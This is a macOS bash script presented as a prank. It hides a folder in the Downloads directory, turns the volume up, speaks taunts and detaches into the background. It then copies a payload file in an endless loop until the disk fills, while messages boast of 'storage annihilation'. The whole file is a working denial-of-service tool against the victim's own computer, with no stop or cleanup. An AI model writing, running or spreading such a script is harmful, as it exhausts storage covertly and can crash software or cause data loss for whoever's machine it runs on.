#!/bin/bash

# Karan's Ultimate Prank v3.4 - BULLETPROOF EDITION
# Simplified execution, guaranteed to work

VERSION="3.4.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
BOLD='\033[1m'; BLINK='\033[5m'; BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'; BG_RED='\033[41m'; WHITE='\033[1;37m'; NC='\033[0m'

# Funny messages
FUNNY_MESSAGES=(
    "🎪 Welcome to Karan's digital circus!"
    "🔥 Disk space is overrated anyway..."
    "💀 Your storage is about to meet its maker!"
    "⚡ Faster than your regrets!"
    "🌪️ Creating digital chaos..."
    "🎯 Bullseye! Another file bites the dust!"
    "🚀 To infinity and beyond your storage!"
    "💎 Every copy is a precious gem!"
    "🔮 Predicting your future: No storage left!"
    "🎨 Painting your disk full!"
    "⚔️ In the battle of space vs files, files win!"
    "🎵 Can you hear the hard drive crying?"
    "🍕 Like pizza slices, but for your disk!"
    "🌟 Making your disk famous, one file at a time!"
    "🎪 Ladies and gentlemen, the greatest show on disk!"
    "🎭 This is my masterpiece!"
)

# Setup function
setup() {
    mkdir -p "$HIDDEN_DIR"
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    touch "$HIDDEN_DIR/.log"
}

# Print function
print_msg() {
    echo -e "${1}${2}${NC}"
    echo "$(date): $2" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Random message
random_msg() {
    local msg=${FUNNY_MESSAGES[$RANDOM % ${#FUNNY_MESSAGES[@]}]}
    local colors=("$RED$BOLD" "$GREEN$BOLD" "$YELLOW$BOLD" "$BLUE$BOLD" "$PURPLE$BOLD" "$CYAN$BOLD")
    local color=${colors[$RANDOM % ${#colors[@]}]}
    print_msg "$color$BLINK" "$msg"
}

# Audio
audio() {
    osascript -e "set volume output volume 85" 2>/dev/null || true
    say "$1" 2>/dev/null &
}

# Main prank function
run_prank() {
    local payload="$1"
    local counter=0
    
    # Setup
    setup
    cp "$payload" "$HIDDEN_DIR/.payload"
    
    # Start messages
    print_msg "$PURPLE$BOLD$BLINK" "🎭 Karan's Ultimate Prank v3.4 - BULLETPROOF!"
    print_msg "$CYAN$BOLD" "⚡ Lightning speed mode activated!"
    
    # Audio
    audio "Ding dong! Welcome to Karan's ultimate digital prank!"
    audio "Prepare for storage annihilation at light speed!"
    
    # Initial chaos
    print_msg "$RED$BOLD$BLINK" "🚀 INITIATING LIGHT-SPEED DIGITAL WARFARE!"
    random_msg
    
    # Main duplication loop
    while cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_ultimate_$(printf "%08d" $counter).jpg" 2>/dev/null; do
        counter=$((counter + 1))
        
        # Chaos messages
        if [[ $((counter % 50)) -eq 0 ]]; then
            random_msg
        fi
        
        # Progress
        if [[ $((counter % 200)) -eq 0 ]]; then
            print_msg "$BG_GREEN$WHITE$BOLD" "💥 DESTRUCTION LEVEL: $counter files eliminated!"
        fi
        
        # Milestones
        case $counter in
            1000)
                print_msg "$BG_YELLOW$RED$BOLD$BLINK" "🎉 FIRST THOUSAND AT LIGHT SPEED!"
                audio "One thousand files! You're in trouble!"
                ;;
            5000)
                print_msg "$BG_RED$WHITE$BOLD$BLINK" "🔥 FIVE THOUSAND! UNSTOPPABLE!"
                audio "Five thousand files! Storage is screaming!"
                ;;
            10000)
                print_msg "$PURPLE$BOLD$BLINK" "💎 TEN THOUSAND! LEGENDARY!"
                audio "Ten thousand files! Digital chaos achieved!"
                ;;
        esac
    done
    
    # Victory
    print_msg "$PURPLE$BOLD$BLINK" "🏆 ULTIMATE VICTORY! Created $counter files!"
    audio "Mission accomplished! Created $counter files at light speed!"
}

# Execution
if [[ "$(uname)" != "Darwin" ]]; then
    echo "💀 ERROR: macOS required!"
    exit 1
fi

if [[ ! -f "$1" ]]; then
    echo "🔍 ERROR: Payload not found!"
    exit 1
fi

# SIMPLIFIED: Run directly without complex detachment
if [[ "$2" == "--background" ]]; then
    # Background execution
    exec > /dev/null 2>&1
    run_prank "$1"
else
    # Launch in background and show launch message
    echo -e "${GREEN}${BOLD}🚀 Ultimate Prank launched at light speed!${NC}"
    echo -e "${PURPLE}${BOLD}⚡ Unstoppable execution initiated!${NC}"
    
    # Start background process
    nohup "$0" "$1" --background &
    disown
fi
